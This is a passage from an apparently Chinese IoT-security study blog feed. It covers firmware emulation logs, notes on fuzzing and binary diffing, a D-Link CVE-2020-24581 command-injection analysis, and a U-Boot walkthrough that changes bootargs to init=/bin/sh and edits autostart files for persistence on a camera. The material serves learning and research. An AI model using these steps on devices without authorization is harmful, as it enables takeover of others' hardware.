ct:clcd: PL111 rev2 at 0x10020000</span></span><br><span class="line"><span class="string">clcd-pl11x ct:clcd: CT-CA9X4 hardware, XVGA display</span></span><br><span class="line"><span class="string">v2m_cfg_write: writing 03c8eee0 to 00110001</span></span><br><span class="line"><span class="string">v2m_cfg_write: writing 00000000 to 00710000</span></span><br><span class="line"><span class="string">v2m_cfg_write: writing 00000002 to 00b10000</span></span><br><span class="line"><span class="string">Console: switching to colour frame buffer device 128x48</span></span><br><span class="line"><span class="string">Serial: 8250/16550 driver, 4 ports, IRQ sharing disabled</span></span><br><span class="line"><span class="string">Non-volatile memory driver v1.3</span></span><br><span class="line"><span class="string">armflash-0: Found 2 x16 devices at 0x0 in 32-bit bank. Manufacturer ID 0x000000 Chip ID 0x000000</span></span><br><span class="line"><span class="string">Intel/Sharp Extended Query Table at 0x0031</span></span><br><span class="line"><span class="string">Using buffer write method</span></span><br><span class="line"><span class="string">armflash-1: Found 2 x16 devices at 0x0 in 32-bit bank. Manufacturer ID 0x000000 Chip ID 0x000000</span></span><br><span class="line"><span class="string">Intel/Sharp Extended Query Table at 0x0031</span></span><br><span class="line"><span class="string">Using buffer write method</span></span><br><span class="line"><span class="string">Concatenating MTD devices:</span></span><br><span class="line"><span class="string">(0): "armflash-0"</span></span><br><span class="line"><span class="string">(1): "armflash-1"</span></span><br><span class="line"><span class="string">into device "armflash"</span></span><br><span class="line"><span class="string">RedBoot partition parsing not available</span></span><br><span class="line"><span class="string">afs partition parsing not available</span></span><br><span class="line"><span class="string">bonding: Ethernet Channel Bonding Driver: v3.7.0 (June 2, 2010)</span></span><br><span class="line"><span class="string">bonding: Warning: either miimon or arp_interval and arp_ip_target module parameters must be specified, otherwise bonding will not detect link failures! see bonding.txt for details.</span></span><br><span class="line"><span class="string">tun: Universal TUN/TAP device driver, 1.6</span></span><br><span class="line"><span class="string">tun: (C) 1999-2004 Max Krasnyansky &lt;maxk@qualcomm.com&gt;</span></span><br><span class="line"><span class="string">smsc911x: Driver version 2008-10-21.</span></span><br><span class="line"><span class="string">smsc911x-mdio: probed</span></span><br><span class="line"><span class="string">eth0: attached PHY driver [Generic PHY] (mii_bus:phy_addr=ffffffff:01, irq=-1)</span></span><br><span class="line"><span class="string">net eth0: MAC Address: 52:54:00:12:34:56</span></span><br><span class="line"><span class="string">isp1760 isp1760: NXP ISP1760 USB Host Controller</span></span><br><span class="line"><span class="string">isp1760 isp1760: new USB bus registered, assigned bus number 1</span></span><br><span class="line"><span class="string">isp1760 isp1760: Scratch test failed.</span></span><br><span class="line"><span class="string">isp1760 isp1760: can'</span>t setup</span><br><span class="line">isp1760 isp1760: USB bus 1 deregistered</span><br><span class="line">isp1760: Failed to register the HCD device</span><br><span class="line">Initializing USB Mass Storage driver...</span><br><span class="line">usbcore: registered new interface driver usb-storage</span><br><span class="line">USB Mass Storage support registered.</span><br><span class="line">mousedev: PS/2 mouse device common <span class="keyword">for</span> all mice</span><br><span class="line">rtc-pl031 mb:rtc: rtc core: registered pl031 as rtc0</span><br><span class="line">mmci-pl18x mb:mmci: mmc0: PL181 manf 41 rev0 at 0x10005000 irq 41,42 (pio)</span><br><span class="line">sdhci: Secure Digital Host Controller Interface driver</span><br><span class="line">sdhci: Copyright(c) Pierre Ossman</span><br><span class="line">usbcore: registered new interface driver ushc</span><br><span class="line">usbcore: registered new interface driver usbhid</span><br><span class="line">usbhid: USB HID core driver</span><br><span class="line">oprofile: using arm/armv7-ca9</span><br><span class="line">Netfilter messages via NETLINK v0.30.</span><br><span class="line">nf_conntrack version 0.5.0 (3974 buckets, 15896 max)</span><br><span class="line">ctnetlink v0.93: registering with nfnetlink.</span><br><span class="line">ip_set: protocol 6</span><br><span class="line">ip_tables: (C) 2000-2006 Netfilter Core Team</span><br><span class="line">TCP cubic registered</span><br><span class="line">NET: Registered protocol family 10</span><br><span class="line">IPv6 over IPv4 tunneling driver</span><br><span class="line">NET: Registered protocol family 17</span><br><span class="line">Bridge firewalling registered</span><br><span class="line">802.1Q VLAN Support v1.8 Ben Greear &lt;greearb@candelatech.com&gt;</span><br><span class="line">All bugs added by David S. Miller &lt;davem@redhat.com&gt;</span><br><span class="line">VFP support v0.3: implementor 41 architecture 3 part 30 variant 9 rev 0</span><br><span class="line">mmc0: host does not support reading <span class="built_in">read</span>-only switch. assuming write-enable.</span><br><span class="line">mmc0: new SD card at address 4567</span><br><span class="line">rtc-pl031 mb:rtc: setting system clock to 2021-02-07 02:34:52 UTC (1612665292)</span><br><span class="line">mmcblk0: mmc0:4567 QEMU! 48.0 MiB </span><br><span class="line"> mmcblk0: unknown partition table</span><br><span class="line">input: AT Raw Set 2 keyboard as /devices/mb:kmi0/serio0/input/input0</span><br><span class="line">input: ImExPS/2 Generic Explorer Mouse as /devices/mb:kmi1/serio1/input/input1</span><br><span class="line">EXT2-fs (mmcblk0): warning: mounting unchecked fs, running e2fsck is recommended</span><br><span class="line">VFS: Mounted root (ext2 filesystem) on device 179:0.</span><br><span class="line">Freeing init memory: 200K</span><br><span class="line">Starting logging: OK</span><br><span class="line">Initializing random number generator... EXT2-fs (mmcblk0): error: ext2_lookup: deleted inode referenced: 1274</span><br><span class="line">EXT2-fs (mmcblk0): error: remounting filesystem <span class="built_in">read</span>-only</span><br><span class="line">EXT2-fs (mmcblk0): error: ext2_lookup: deleted inode referenced: 1274</span><br><span class="line">EXT2-fs (mmcblk0): error: remounting filesystem <span class="built_in">read</span>-only</span><br><span class="line"><span class="built_in">read</span>-only file system detected...done</span><br><span class="line">Starting network...</span><br><span class="line">net eth0: SMSC911x/921x identified at 0xd08c0000, IRQ: 47</span><br><span class="line">Starting crond OK</span><br><span class="line">Starting dropbear sshd: OK</span><br><span class="line">Starting ARM-X OK</span><br><span class="line"></span><br><span class="line">    _ ___ __  ___  __</span><br><span class="line">   / \ _ \  \/ \ \/ /  by Saumil Shah | The ARM Exploit Laboratory</span><br><span class="line">  / _ \  / |\/) )  (   @therealsaumil | blog.exploitlab.net</span><br><span class="line"> /_/ \_\_\_| /_/_/\_\  2.6.39.4-armexploitlab-therealsaumil [armv7l]</span><br><span class="line"></span><br><span class="line">ARM-X DEVICE CONSOLE</span><br><span class="line"></span><br><span class="line">ARM-X login:</span><br></pre></td></tr></table></figure>
<ul>
<li>111</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找到InitCfm函数的定义（cfmd中引用，so中定义</span></span><br><span class="line">lxl@MBP  ~/Desktop/tmp/cur/17-armx-tenda/squashfs-root  grep -r <span class="string">"InitCfm"</span> .</span><br><span class="line">grep: ./home: No such file or directory</span><br><span class="line">Binary file ./bin/cfmd matches</span><br><span class="line">grep: ./etc: No such file or directory</span><br><span class="line">grep: ./root: Permission denied</span><br><span class="line">Binary file ./lib/libCfm.so matches</span><br><span class="line">grep: ./lib/modules/2.6.36.4brcmarm/<span class="built_in">source</span>: No such file or directory</span><br><span class="line">grep: ./lib/modules/2.6.36.4brcmarm/build: No such file or directory</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">//here，对这些函数的分析看不懂了</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="https://github.com/therealsaumil/armx/blob/master/docs/emulating-tenda-ac15.md" target="_blank" rel="noopener">https://github.com/therealsaumil/armx/blob/master/docs/emulating-tenda-ac15.md</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
        <tag>固件模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>IOT安全-文章学习笔记-3</title>
    <url>/2021/10/02/iot/IOT%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="IOT安全-文章学习笔记-3"><a href="#IOT安全-文章学习笔记-3" class="headerlink" title="IOT安全-文章学习笔记-3"></a>IOT安全-文章学习笔记-3</h1><h2 id="IoT-设备固件分析之网络协议-fuzz"><a href="#IoT-设备固件分析之网络协议-fuzz" class="headerlink" title="IoT 设备固件分析之网络协议 fuzz"></a>IoT 设备固件分析之网络协议 fuzz</h2><ul>
<li>概要：fuzz概念、boofuzz原理及实战</li>
<li>程序分析4法：模糊测试、补丁比对、工具静态扫描（如ida/ghidra脚本）、人工审计</li>
<li><p>模糊测试</p>
<ul>
<li>黑盒测试的思想、构造大量的畸形数据作为输入，来发现安全缺陷或漏洞</li>
<li>测试用例生成方式：基于变异的、基于生成的</li>
<li>对目标程序的理解程度：黑盒、灰盒、白盒</li>
<li>动态分析技术，需要有真实设备，或固件仿真</li>
</ul>
</li>
<li><p>网络协议分两类：</p>
<ul>
<li>文本协议，如HTTP、FTP等，数据包内容都是可见字符</li>
<li>二进制协议，数据包内容大部分是不可见字符，在工控设备如PLC中比较常见，私有协议</li>
<li>笔者sulley测文本、kitty测二进制，实际二者均能对两类协议进行测试</li>
</ul>
</li>
<li><p>IoT设备的异常监控</p>
<ul>
<li>通过可用性判断，但粒度比较粗</li>
<li>异常后需要环境恢复，如重启设备，一般崩溃后会自动重启</li>
</ul>
</li>
<li><p>Boofuzz是Sulley的继承者</p>
<ul>
<li>主要步骤：构造请求、设置会话、监控及重启机制、开始fuzz</li>
<li>原理见官网、实战见本文</li>
</ul>
</li>
</ul>
<h2 id="Zyxel设备eCos固件加载地址分析"><a href="#Zyxel设备eCos固件加载地址分析" class="headerlink" title="Zyxel设备eCos固件加载地址分析"></a>Zyxel设备eCos固件加载地址分析</h2><ul>
<li>链接<ul>
<li>原文：<a href="https://cq674350529.github.io/2021/03/04/Zyxel设备eCos固件加载地址分析/" target="_blank" rel="noopener">https://cq674350529.github.io/2021/03/04/Zyxel设备eCos固件加载地址分析/</a></li>
<li>英文：<a href="https://ecos.wtf/2021/03/30/ecos-load-address" target="_blank" rel="noopener">https://ecos.wtf/2021/03/30/ecos-load-address</a></li>
<li>固件：<a href="https://www.zyxel.com/support/download_landing/product/rgs200_12p_13.shtml?c=gb&amp;l=en&amp;pid=20160321160003&amp;tab=Firmware&amp;pname=RGS200-12P" target="_blank" rel="noopener">https://www.zyxel.com/support/download_landing/product/rgs200_12p_13.shtml?c=gb&amp;l=en&amp;pid=20160321160003&amp;tab=Firmware&amp;pname=RGS200-12P</a></li>
<li>脚本：<a href="https://gist.github.com/cq674350529/74e5b6d31780882c54c80302172ad753" target="_blank" rel="noopener">https://gist.github.com/cq674350529/74e5b6d31780882c54c80302172ad753</a></li>
</ul>
</li>
</ul>
<h2 id="使用Ghidra-P-Code进行辅助逆向分析"><a href="#使用Ghidra-P-Code进行辅助逆向分析" class="headerlink" title="使用Ghidra P-Code进行辅助逆向分析"></a>使用Ghidra P-Code进行辅助逆向分析</h2><ul>
<li>参考：<ul>
<li><a href="https://github.com/HackOvert/GhidraSnippets" target="_blank" rel="noopener">https://github.com/HackOvert/GhidraSnippets</a></li>
<li><a href="https://blag.nullteilerfrei.de/2020/02/02/defeating-sodinokibi-revil-string-obfuscation-in-ghidra/" target="_blank" rel="noopener">https://blag.nullteilerfrei.de/2020/02/02/defeating-sodinokibi-revil-string-obfuscation-in-ghidra/</a></li>
<li>ghidra API Helper</li>
</ul>
</li>
<li>编写脚本：<ul>
<li>rename_func：利用报错信息来重命名函数</li>
<li>get_caller：找到函数的所有调用，并解析出参数</li>
<li>以tplink-archer-c5设备、v4版本、httpd程序、cdbg_print函数为例</li>
</ul>
</li>
</ul>
<h2 id="00-BinDiff二进制比较简介"><a href="#00-BinDiff二进制比较简介" class="headerlink" title="00-BinDiff二进制比较简介"></a>00-BinDiff二进制比较简介</h2><p><a href="https://mp.weixin.qq.com/s/fPjqO_L5aHxzVUu8GtIgeA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/fPjqO_L5aHxzVUu8GtIgeA</a></p>
<p><a href="http://blog.nsfocus.net/bindiff/" target="_blank" rel="noopener">http://blog.nsfocus.net/bindiff/</a></p>
<ul>
<li>两种方法<ul>
<li>bindiff直接对两个idb进行比较</li>
<li>IDA中用BinDiff插件比较</li>
<li>（推荐法2）</li>
</ul>
</li>
<li>方便符号迁移，先new再old<ul>
<li>先IDA打开new.i64</li>
<li>Edit-&gt;Plugins-&gt;BinDiff (Ctrl-6)-&gt;Diff Database-&gt;选择old.i64（实测路径不可有中文）</li>
<li>此时，primary为new，secondary为old</li>
</ul>
</li>
<li>方便看漏洞点，先old再new<ul>
<li>只能看先打开的的反编译，为方便查看漏洞点，应先old</li>
<li>primary-old-漏洞版</li>
<li>secondary-new-修复版</li>
</ul>
</li>
<li>比较结束后会打开四个窗口，绝大多数情况下，只需要关心”Matched Functions”</li>
<li>使用技巧<ul>
<li>Zoom to Basicblock，放大block</li>
<li>Fit Graph Content恢复原大小</li>
<li>Toogle Proximity Browsing切换显示模式，只显示目标块附近的块</li>
<li>Copy Basic Block Address复制块地址</li>
</ul>
</li>
<li>其它<ul>
<li>bindiff7-win10，有的按钮显示乱码，英文正常</li>
</ul>
</li>
<li><p>未完待看</p>
<h2 id="部分IoT设备逆向工程知识点"><a href="#部分IoT设备逆向工程知识点" class="headerlink" title="部分IoT设备逆向工程知识点"></a>部分IoT设备逆向工程知识点</h2></li>
</ul>
<p><a href="https://mp.weixin.qq.com/s/g6Un-QvXVbTyr7YSOfRfqg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/g6Un-QvXVbTyr7YSOfRfqg</a></p>
<h2 id="IoT设备逆向工程中的函数识别"><a href="#IoT设备逆向工程中的函数识别" class="headerlink" title="IoT设备逆向工程中的函数识别"></a>IoT设备逆向工程中的函数识别</h2><p><a href="https://mp.weixin.qq.com/s/eODNgJ_Tq2MDQP4ZbwnoaA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/eODNgJ_Tq2MDQP4ZbwnoaA</a></p>
<ul>
<li>符号迁移：<ul>
<li>场景：分析过一个裸格式的IoT固件，已经重命名一批关键函数，某天需要分析另一个与前者高度接近的新版固件</li>
<li>法1: 用BinDiff、PatchDiff2进行二进制比较</li>
<li>法2: IDB2PAT插件，从idb中导出pat再制作sig（ELF/IDB -&gt; PAT -&gt; SIG）</li>
</ul>
</li>
<li>未完待看</li>
</ul>
<h2 id="Whitepaper-Router-Vulnerability-Present-for-a-Decade"><a href="#Whitepaper-Router-Vulnerability-Present-for-a-Decade" class="headerlink" title="Whitepaper-Router_Vulnerability_Present_for_a_Decade"></a>Whitepaper-Router_Vulnerability_Present_for_a_Decade</h2><ul>
<li>概要：非技术文章，只了解大概</li>
<li>CVE- 2021-20090，，并非是buffalo路由器所独有的，而是其底层的Arcadyan软件，影响了多个厂家的设备</li>
<li>buffalo与arcadyan，二者是何关系？后者制造设备、提供固件，前者仅是个品牌？</li>
<li>受影响的设备都有漏洞A，但一部分设备有漏洞B，在其它设备上并不存在，说明至少有两个软件提供商</li>
<li>现代软件的复杂性，依赖于第三方代码及共享库的重用，导致供应链风险</li>
</ul>
<h2 id="浅谈固件Fuzz"><a href="#浅谈固件Fuzz" class="headerlink" title="浅谈固件Fuzz"></a>浅谈固件Fuzz</h2><p><a href="https://mp.weixin.qq.com/s/IL-wIM8wePZL07l9YJnX_Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/IL-wIM8wePZL07l9YJnX_Q</a></p>
<ul>
<li><p>概述：fuzz综述、firm-AFL</p>
</li>
<li><p>ps：学术化，实践性不高，学习思路</p>
</li>
<li><p>两论文（详见pdf）</p>
<ul>
<li>嵌入式fuzz综述：What You Corrupt Is Not What You Crash: Challenges in Fuzzing Embedded Devices</li>
<li>一种fuzz方案：FIRM-AFL: High-Throughput Greybox Fuzzing of IoT Firmware via Augmented Process Emulation</li>
</ul>
</li>
<li><p>设备从操作系统层面可以分为三类</p>
<ul>
<li>基于 Linux：如大部分的摄像头、路由器。</li>
<li>自定义操作系统：如uClinux、VxWorks </li>
<li>没有抽象操作系统：不存在内核与用户层的逻辑分离。很少Fuzz ，设备代码量较小，只用逆向说不定都可以还原</li>
</ul>
</li>
<li><p>嵌入式设备Fuzz 的难点</p>
<ul>
<li>错误检测</li>
<li>性能和可扩展性</li>
<li>插桩</li>
</ul>
</li>
<li><p>QEMU</p>
<ul>
<li>用户模式仅模拟 CPU 的运行，而系统模式除了模拟 CPU 的运行，还要管理、模拟外围的设备</li>
<li>用户模式的执行速度大概比系统模式快了10倍，但有时仅用户模式是无法运行程序的</li>
</ul>
</li>
<li><p>Firm-AFL</p>
<ul>
<li>思路：两模式相结合，系统模式提供用户模式无法运行时的环境，用户模式作为主要的运行状态来提高虚拟性能</li>
<li>类似AFL（先forkserser再fork其它），先启动系统模式的实例，在某个特定点，fork出其它用户模式的实例</li>
<li>两个模式下的实例，需要共享一些东西来进行同步</li>
<li>[翻译]Firm-AFL：高效的IOT固件灰盒fuzz：<a href="https://bbs.pediy.com/thread-266036.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-266036.htm</a></li>
</ul>
</li>
</ul>
<h2 id="车联网安全之CAN协议浅谈"><a href="#车联网安全之CAN协议浅谈" class="headerlink" title="车联网安全之CAN协议浅谈"></a>车联网安全之CAN协议浅谈</h2><p><a href="https://mp.weixin.qq.com/s/wbuuiDTdAXWo0_BRd8u7sA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/wbuuiDTdAXWo0_BRd8u7sA</a></p>
<ul>
<li><p>ecu在can总线协议的网络中相互连接</p>
</li>
<li><p>can</p>
<ul>
<li>无法短时间内更替且安全性极低</li>
<li>车联网安全的一个重要研究方向</li>
<li>can帧结构：id、dlc、data</li>
</ul>
</li>
<li><p>data中信号分为五种，主要工作便是识别其中各个位的含义，如fbca算法</p>
</li>
</ul>
<h2 id="ARM固件加载基址"><a href="#ARM固件加载基址" class="headerlink" title="ARM固件加载基址"></a>ARM固件加载基址</h2><ul>
<li>两种：猜、算</li>
<li>switch跳转表：记录case的绝对地址</li>
<li>switch有两种跳转：1-jmp 基址+偏移到case、2-jmp 相对地址到default</li>
<li>break跳出switch：switch结束处或者default（可将二者等同）</li>
<li>跳转表记录线性的case，如果某个case没有，则填充default的，即default的绝对地址放在了跳转表中</li>
<li>数学公式（将0作为基址，真假针对default）：真=真基址+偏移，假=0+偏移，二者相减</li>
<li>default出现在两处：jmp相对地址、跳转表中的绝对地址，尽管形式不同，但最终是同值的。以0为基址时，绝对地址是真，相对地址是假，因为此时相对地址即偏移即假地址，加了0嘛，真-假=真基址，即绝对地址-相对地址=基址</li>
<li>用了论文中：基于跳转表定位加载基址的第二种方法，对于第一种的评价不对，一法思想是：对于同一个case，其在跳转表中的差值、代码块中的差值是一样的（差值即case语句长度），通过差值来判定出某个具体的case。</li>
</ul>
<h2 id="常见嵌入式Web服务器CGI处理功能简要分析"><a href="#常见嵌入式Web服务器CGI处理功能简要分析" class="headerlink" title="常见嵌入式Web服务器CGI处理功能简要分析"></a>常见嵌入式Web服务器CGI处理功能简要分析</h2><p><a href="https://larry.ngrep.me/2020/02/03/iot-web-server-cgi-handler-analysis/" target="_blank" rel="noopener">https://larry.ngrep.me/2020/02/03/iot-web-server-cgi-handler-analysis/</a></p>
<ul>
<li>uhttpd-源码分析-LuCI：<ul>
<li>即最终调用的<code>/www/cgi-bin/luci</code>，遵循MVC的后端Web处理<a href="https://github.com/openwrt/luci/wiki" target="_blank" rel="noopener">框架</a></li>
<li><code>/usr/lib/lua/luci/controller</code>目录下的lua脚本包含请求url的相关路由信息</li>
<li>脚本中的<code>index</code>函数，调用<code>entry (path, target, title, order)</code>函数创建dispatching node</li>
<li>关注<code>target</code>参数，可能传递<code>call</code>函数，来调用函数处理请求</li>
<li>其它部分同：chamd5-关于路由器的CGI漏洞分析及挖掘</li>
</ul>
</li>
<li>uhhtpd-实例-命令执行<ul>
<li>斐讯路由器，基于openwrt，虽然用lighttpd，但最终调用luci</li>
<li>/usr/lib/lua/luci/controller/admin/autoupgrade.lua文件中的index函数</li>
<li>entry({“admin”, “more_sysset”, “autoupgrade”, “save”}, call(“save”), nil, nil)，target参数为call-save</li>
<li>save函数：接收用户数据local time = luci.http.formvalue(“autoUpTime”)、命令指定拼接local time = luci.http.formvalue(“autoUpTime”)</li>
</ul>
</li>
<li>lua其它<ul>
<li>为加速执行，lua脚本会预编译成为字节码，故需要<a href="https://webcache.googleusercontent.com/search?q=cache:DRSZOu-QEBUJ:storypku.com/2015/07/+&amp;cd=5&amp;hl=zh-CN&amp;ct=clnk" target="_blank" rel="noopener">反编译</a>（如tplink-c5400中，LuaQ开头的标识）</li>
<li>更改lua虚拟机的<a href="https://e3pem.github.io/2019/07/03/IoT/小米路由器从开始到放弃/" target="_blank" rel="noopener">情况</a>，需要逆向解析其自定义的opcode，并配合历史固件版本分析</li>
<li>lua语言自身的<a href="https://conference.hitb.org/hitbsecconf2019ams/materials/D1T1 - SeasCoASA - Exploiting a Small Leak in a Great Ship - Kaiyi Xu &amp; Lily Tang.pdf" target="_blank" rel="noopener">安全问题</a></li>
</ul>
</li>
<li>todo：只看了02-uhttpd</li>
</ul>
<h2 id="CVE-2020-24581-D-Link-DSL-2888A-远程命令执行漏洞分析"><a href="#CVE-2020-24581-D-Link-DSL-2888A-远程命令执行漏洞分析" class="headerlink" title="CVE-2020-24581 D-Link DSL-2888A 远程命令执行漏洞分析"></a>CVE-2020-24581 D-Link DSL-2888A 远程命令执行漏洞分析</h2><p><a href="https://www.anquanke.com/post/id/229323" target="_blank" rel="noopener">https://www.anquanke.com/post/id/229323</a></p>
<ul>
<li>概要：认证绕过、命令执行、httpd与cgi</li>
<li>通告信息（参考链接中）：<ul>
<li>D-Link: Multiple Security Vulnerabilities Leading to RCE</li>
<li>认证绕过1：无效的认证机制L：登录界面，输入任意密码；尽管提示密码错误，但已经产生有效的访问session；随后可访问任何需要认证的页面</li>
<li>认证绕过2：通过源ip来进行认证、可伪造管理员的ip</li>
<li>信息泄漏：8008端口、/tmp/cfg/lib_cfg_cfgcmd、/tmp/.nvram、明文的账号/密码</li>
<li>ftp配置错误：路由器有文件共享功能，通过ftp实现；ftp没有控制好路径，能访问到系统目录；ftp+ip、登录（信息泄漏时获取到密码）、get /etc/passwd下载敏感文件</li>
<li>命令执行：隐藏功能点，未web界面上不可见（不可触发）、需认证，但认证机制是无效的可绕过</li>
</ul>
</li>
<li>未授权命令执行<ul>
<li>命令执行：execute_cmd.cgi，隐藏功能，web界面不可访问</li>
<li>认证绕过：随便输入密码就可达到认证效果</li>
</ul>
</li>
<li>dhttpd执行cgi<ul>
<li>先加载cgi模块（web初始化函数中，还有goform组件，目录分别为/goform、/cgi-bin）</li>
<li>拼接路径“/cgi-bin”与cgi</li>
<li>stat判断文件是否存在</li>
<li>access判断是否有执行权限</li>
<li>chdir改变当前目录</li>
<li>给cgi配置环境变量</li>
<li>将cgi及环境变量传递给execve，执行cgi</li>
</ul>
</li>
<li>execute_cmd.cgi<ul>
<li>从环境变量QUERY_STRING中获取到第二个参数的值，反引号命令执行，无任何过滤</li>
<li>第二个参数的键值均没有验证，故只要是第二个参数的值均可作为命令执行，参数名无所谓</li>
</ul>
</li>
<li>参数的传播：ajax.js拼接url、xmlhttp.open发送到dhttpd、通过环境变量传给cgi</li>
</ul>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>栈溢出</tag>
        <tag>摄像头</tag>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title>uboot getshell</title>
    <url>/2021/09/23/iot/%E5%88%A9%E7%94%A8uboot%20getshell/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="uboot-getshell"><a href="#uboot-getshell" class="headerlink" title="uboot-getshell"></a>uboot-getshell</h2><ul>
<li>任意键进入uboot，修改环境变量</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lxl@MBP  ~  minicom -c on</span><br><span class="line">U-Boot 2013.10.0-AK_V3.0.08 (Mar 05 2019 - 15:37:04)</span><br><span class="line"></span><br><span class="line">DRAM:  64 MiB</span><br><span class="line">8 MiB</span><br><span class="line">Create flash partition table init OK!</span><br><span class="line">ANYKA SDHC/MMC4.0: 0</span><br><span class="line">Load Env CRC OK!</span><br><span class="line">In:    serial</span><br><span class="line">Out:   serial</span><br><span class="line">Err:   serial</span><br><span class="line">Net:   AKEthernet-0</span><br><span class="line"></span><br><span class="line">Hit any key to stop autoboot:  3</span><br><span class="line"> 0</span><br><span class="line"></span><br><span class="line">anyka$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改环境变量并保存</span></span><br><span class="line"><span class="comment"># bootargs的init=/bin/sh</span></span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/sbin/init mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$setenv</span> bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$saveenv</span></span><br><span class="line"></span><br><span class="line">Saving Environment to SPI Flash...</span><br><span class="line">Env save <span class="keyword">done</span> OK</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M</span><br></pre></td></tr></table></figure>
<ul>
<li>重启，uboot后进入sh，修改自启程序，实现常驻</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0 mtdblock8对应/mnt/mtd，jffs2文件系统（自启程序nvipcstart.sh位于此）</span></span><br><span class="line">~ <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line">tmpfs on /tmp <span class="built_in">type</span> tmpfs (rw,relatime)</span><br><span class="line">tmpfs on /var <span class="built_in">type</span> tmpfs (rw,relatime)</span><br><span class="line">devpts on /dev/pts <span class="built_in">type</span> devpts (rw,relatime,mode=600,ptmxmode=000)</span><br><span class="line">tmpfs on /mnt/mtd <span class="built_in">type</span> tmpfs (rw,relatime)</span><br><span class="line">sysfs on /sys <span class="built_in">type</span> sysfs (rw,relatime)</span><br><span class="line">/dev/mtdblock5 on /usr <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">/dev/mtdblock6 on /mvs <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">/dev/mtdblock7 on /ext <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">/dev/mtdblock8 on /mnt/mtd <span class="built_in">type</span> jffs2 (rw,relatime)</span><br><span class="line">/dev/loop0 on /tmp/ramdisk <span class="built_in">type</span> vfat (rw,relatime,fmask=0022,dmask=0022,codepage=cp437,iocharset=iso8859-1,shortname=mixed,errors=remount-ro)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 进入sh</span></span><br><span class="line">/bin/sh: c��ɹ���off</span><br><span class="line">~ <span class="comment"># ls</span></span><br><span class="line">bin   dev   etc   ext   init  lib   mnt   mvs   proc  sbin  sys   tmp   usr   var</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 mount命令需挂载proc（本身挂载proc就需要mount，不矛盾？）</span></span><br><span class="line">~ <span class="comment"># mount</span></span><br><span class="line">mount: no /proc/mounts</span><br><span class="line">~ <span class="comment"># mount -t proc /proc</span></span><br><span class="line">~ <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 挂载mtdblock8</span></span><br><span class="line">~ <span class="comment"># cd mnt/mtd</span></span><br><span class="line">/mnt/mtd <span class="comment"># ls</span></span><br><span class="line">/mnt/mtd <span class="comment"># mount -t jffs2 /dev/mtdblock8 /mnt/mtd</span></span><br><span class="line">/mnt/mtd <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line">/dev/mtdblock8 on /mnt/mtd <span class="built_in">type</span> jffs2 (rw,relatime)</span><br><span class="line"></span><br><span class="line">/mnt/mtd <span class="comment"># cd ..</span></span><br><span class="line">/mnt <span class="comment"># cd mtd/</span></span><br><span class="line">/mnt/mtd <span class="comment"># ls</span></span><br><span class="line">DDNSClient.ini          inet.conf               prerun</span><br><span class="line">ResetBind.ini           ipsourceserver.ini      recorde.ini</span><br><span class="line">as9ipcwatchdog          isp_mis2006.conf        recorder</span><br><span class="line">as9nvserver             mqtest_stop             resolv.conf</span><br><span class="line">as9updatednsip          mtd_remount.sh          stopallapp.sh</span><br><span class="line">asnvdvrclientdemo       mv_clog_cache.data      styleId</span><br><span class="line">audiofile_player        mvconf                  user_info.ini</span><br><span 